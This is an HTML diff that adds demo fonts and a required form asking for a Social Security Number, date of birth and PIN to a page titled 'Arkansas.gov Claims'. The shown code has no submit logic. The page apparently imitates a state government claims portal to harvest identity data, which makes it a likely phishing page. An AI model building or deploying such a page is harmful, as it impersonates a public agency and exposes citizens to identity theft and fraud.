@@ -4,8 +4,51 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Arkansas.gov Claims</title>
+    <style>
+      @font-face {
+        font-family: 'Alfabet';
+        src: url('Fontspring-DEMO-alfabet-regular.otf') format('opentype');
+        font-weight: normal;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: 'Alfabet';
+        src: url('Fontspring-DEMO-alfabet-bold.otf') format('opentype');
+        font-weight: bold;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: 'Alfabet';
+        src: url('Fontspring-DEMO-alfabet-light.otf') format('opentype');
+        font-weight: 300;
+        font-style: normal;
+      }
+    </style>
   </head>
   <body style="margin:0;">
     <div id="root"></div>
+
+    <!-- Professional Form Section -->
+    <div style="width: 100vw; display: flex; justify-content: center; margin-top: 48px;">
+      <form style="background: #fff; border: 3px solid #071C93; box-shadow: 0 1px 6px rgba(0,0,0,0.04); border-radius: 8px; padding: 32px 24px; width: 400px; max-width: 98vw; font-family: Arial, Helvetica, sans-serif; display: flex; flex-direction: column; gap: 22px;">
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <label for="ssn" style="font-size: 19px; font-weight: 700; color: #1a1a1a;">ID (Social Security Number)</label>
+          <span style="color: #b30000; font-weight: 700; font-size: 20px;">*</span>
+        </div>
+        <input id="ssn" name="ssn" type="text" style="padding: 16px; border-radius: 12px; font-size: 20px; border: 2px solid #ccc;" required />
+
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <label for="dob" style="font-size: 19px; font-weight: 700; color: #1a1a1a;">DOB (MM/DD/YYYY)</label>
+          <span style="color: #b30000; font-weight: 700; font-size: 20px;">*</span>
+        </div>
+        <input id="dob" name="dob" type="text" placeholder="MM/DD/YYYY" style="padding: 16px; border-radius: 12px; font-size: 20px; border: 2px solid #ccc; text-align: center;" required />
+
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <label for="pin" style="font-size: 19px; font-weight: 700; color: #1a1a1a;">PIN (Personal Identification Number)</label>
+          <span style="color: #b30000; font-weight: 700; font-size: 20px;">*</span>
+        </div>
+        <input id="pin" name="pin" type="password" style="padding: 16px; border-radius: 12px; font-size: 20px; border: 2px solid #ccc;" required />
+      </form>
+    </div>
   </body>
 </html>
